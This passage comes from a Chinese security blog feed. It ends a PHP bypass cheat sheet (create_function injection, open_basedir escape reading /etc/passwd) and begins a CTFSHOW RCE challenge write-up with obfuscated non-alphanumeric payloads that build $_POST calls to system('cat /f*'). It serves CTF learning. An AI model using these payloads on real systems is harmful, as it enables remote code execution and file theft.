href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() /e模式下可以执行代码：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p><blockquote><p>preg_replace — 执行一个正则表达式的搜索和替换(PHP 4, PHP 5, PHP 7)</p><p>搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p><p>第一个参数<code>$pattern</code>：搜索的模式，可以是一个字符串或者字符串数组，可以加<code>\e</code>修正符。</p><p>第二个参数<code>$replacement</code>：要替换的字符。</p><p>第三个参数<code>$subject</code>：需要被处理的字符串。</p><p>问题出在第一个参数的<code>\e</code>修正符上。当加上了<code>\e</code>修正符号时，<code>$replacement</code>会被当做php代码片段执行。这个环境需要在<code>php5.4</code>下。<code>php7.0</code>完全放弃了该函数，<code>php5.5的后续版本</code>会爆出提示，要求<code>preg_replace_callback()</code>来代替该函数。</p></blockquote><h4 id="creat-function"><a href="#creat-function" class="headerlink" title="creat_function()"></a>creat_function()</h4><p>代码注入 <a href="https://paper.seebug.org/94/">解析create_function()(seebug.org)</a></p><blockquote><p>创建匿名函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$name&#x27;</span>,<span class="string">&#x27;echo $name.&quot;a&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>就类似于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;  <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>那么传入<code>a=;&#125;phpinfo();/*</code>就会得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;  <span class="keyword">echo</span> <span class="variable">$name</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*;&#125;</span></span><br></pre></td></tr></table></figure><p>;}将前面的语句和函数闭合，/*把后面的;}注释掉，phpinfo()；就成功执行了</p></blockquote><h4 id="curl"><a href="#curl" class="headerlink" title="curl()"></a>curl()</h4><p><a href="https://www.jianshu.com/p/7fab00c11770">php curl实现发送get和post请求 - 简书 (jianshu.com)</a></p><p><a href="https://www.shuzhiduo.com/A/l1dygVWqJe/">网鼎杯-Fakebook-反序列化和SSRF和file协议读取文件 (shuzhiduo.com)</a></p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p><code>strcmp(str1,str2)</code>：比较两个字符串str1和str2</p><ul><li>str1&lt;str2 返回&lt;0</li><li>str1&gt;str2返回&gt;0</li><li>str1=str2 返回0</li></ul><p>ps：数据类型不匹配(即传入非字符串类型)，也会返回0 （仅php&lt;5.3）</p><p>bypass：同样的，给strcmp的参数为数组也会返回null</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 传入 passwd[]=xxx</span><br><span class="line">实际是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等（某种意义上null相当于false）</span><br></pre></td></tr></table></figure><h4 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir()绕过"></a>open_basedir()绕过</h4><h5 id="chdir-、ini-set-函数组合"><a href="#chdir-、ini-set-函数组合" class="headerlink" title="chdir()、ini_set()函数组合"></a>chdir()、ini_set()函数组合</h5><p>利用ini_set()设置php.ini的值，在函数执行时生效，脚本结束后恢复原状。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span> ( <span class="keyword">string</span> <span class="variable">$varname</span> , <span class="keyword">string</span> <span class="variable">$newvalue</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>varname是需要设置的值；newvalue是设置成为新的值 成功时返回旧的值，失败时返回 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">system</span>(‘cat ../../../../../etc/passwd’);</span><br></pre></td></tr></table></figure><h4 id="glob"><a href="#glob" class="headerlink" title="glob:/"></a>glob:/</h4><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式，而单纯传参glob://是没办法列目录的，需要结合其他函数方法</p><p><strong>scandir()+glob://</strong></p><p>只能列出根目录以及open_basedir()允许目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><strong>DirectoryIterator+glob://</strong></p><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payloadL:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*.txt&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#   glob:///*   会列出根目录下的文件</span></span><br><span class="line"><span class="comment">#   glob://*    会列出open_basedir允许目录下的文件</span></span><br></pre></td></tr></table></figure><p><strong>opendir()+readdir()+glob://</strong></p><p>同样只能列出根目录已经open_basedir()允许的目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="一些特性"><a href="#一些特性" class="headerlink" title="一些特性"></a>一些特性</h2><h3 id="PHP处理上传文件"><a href="#PHP处理上传文件" class="headerlink" title="PHP处理上传文件"></a>PHP处理上传文件</h3><p>php在处理上传文件时，会将上传文件放在临时文件夹</p><p>命名格式为：<code>/tmp/php??????</code>（windows下则有[<code>.tmp</code>]后缀） <code>php[0-9A-Za-z]&#123;3,4,5,6&#125;</code>默认为php+4/6位随机数字和大小写字母</p><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><p><code>&lt;?=</code> 是 <code>&lt;?php echo</code> 的简写形式</p><p>做题时可能遇到php被ban，就可以用短标签来绕过</p><p>以下取自php官方文档</p><blockquote><p>当解析一个文件时，PHP 会寻找起始和结束标记，也就是 <code>&lt;?php</code> 和 <code>?&gt;</code>，这告诉 PHP 开始和停止解析二者之间的代码。此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。</p><p>PHP 有一个 echo 标记简写 <code>&lt;?=</code>， 它是更完整的 <code>&lt;?php echo</code> 的简写形式</p><p>ps：短标记 (第三个例子) 是被默认开启的，但是也可以通过 <a href="https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag">short_open_tag</a> php.ini 来直接禁用。如果 PHP 在被安装时使用了 <strong>—disable-short-tags</strong> 的配置，该功能则是被默认禁用的。</p></blockquote><h3 id="分号-被过滤"><a href="#分号-被过滤" class="headerlink" title="分号; 被过滤"></a>分号; 被过滤</h3><p>之前做题遇到，分号<code>;</code>被ban掉，那么咱们传入的语法就不正确,无法正常运行</p><p>绕过方法是利用<code>?&gt;</code>来结尾 要注意的是：<code>?&gt;</code>后的php代码就不会被正常解析，而是当成html输出到页面上</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p><strong>条件</strong>：</p><ul><li>PHP版本小于5.3.4</li><li>php.ini中的magic_quotes_gpc设置为Off</li></ul><p><strong>00截断的原理</strong>：ascii中的0作为特殊字符保留，表示字符串结束</p><p>像十六进制的0x00、url编码中的%00，具体使用情况视环境而定</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wb </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW RCE极限大挑战-Writeup</title>
      <link href="/posts/fa99.html"/>
      <url>/posts/fa99.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-RCE极限挑战"><a href="#CTFSHOW-RCE极限挑战" class="headerlink" title="CTFSHOW RCE极限挑战"></a>CTFSHOW RCE极限挑战</h1><h2 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了’(‘和’.’，没过滤反引号，内联绕过。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自增绕过。</p><blockquote><p>fuzz后发现可用的可见字符有：</p><p>! $ ‘ ( ) + , . / ; = [ ] _</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;;&#x27;</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;</span><br><span class="line">(<span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>])(<span class="variable">$$__</span>[<span class="string">&#x27;__&#x27;</span>]);<span class="comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_=system&amp;__=cat /f*</span><br><span class="line">ctf_show=%24_%3D%5B%5D%3B%24_%20%3D%20&#x27;&#x27;.%24_%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%3B&#x27;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D&#x27;_&#x27;.%24__.%24_%3B(%24%24__%5B&#x27;_&#x27;%5D)(%24%24__%5B&#x27;__&#x27;%5D)%3B</span><br></pre></td></tr></table></figure><h2 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzz后发现可用的可见字符有：</p><p>$ ( ) + , . / 0 1 ; = [ ] _  </p><p>并且代码长度限制要小于105。</p></blockquote><p>可以用数字0或者1，那么就可以通过(0/0)来构造float型的NAN，(1/0)来构造float型的INF，然后转换成字符串型，得到”NAN”和”INF”中的字符了，</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>]; <span class="comment">//这里是关键，php的计算上面有说，返回N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//这里是进行了++的，所以$_等于P, $__=PO。</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">0</span>]); <span class="comment">// $_POST[_]($_POST[0]);</span></span><br></pre></td></tr></table></figure><p>至于为什么使用POST，因为N下面就有post的所有字母，而且比较近，而且php的ascii不能自减，所以组GET要废很多时间。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=((0/0)._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战4"><a href="#RCE挑战4" class="headerlink" title="RCE挑战4"></a>RCE挑战4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzz一下，发现可用的字符只有</p><p>$ ( ) + , . / 0 ; = [ ] _</p><p>要求长度小于84</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>]; <span class="comment">//更短的N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//这里是进行了++的，所以$_等于P, $__=PO.</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]); <span class="comment">// $_POST[_]($_POST[1]);</span></span><br></pre></td></tr></table></figure><p>RCE挑战3的playload也能用，但是又尝试压到了78个字符。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=(_/_._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战5"><a href="#RCE挑战5" class="headerlink" title="RCE挑战5"></a>RCE挑战5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制73个字符，而且0也不可以用了</p><p><code>$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.++$_.++$_;$$_[_]($$_[0]);</code></p><p>重新fuzz，变量这边还能再缩，尝试一些希腊字符等不可见字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 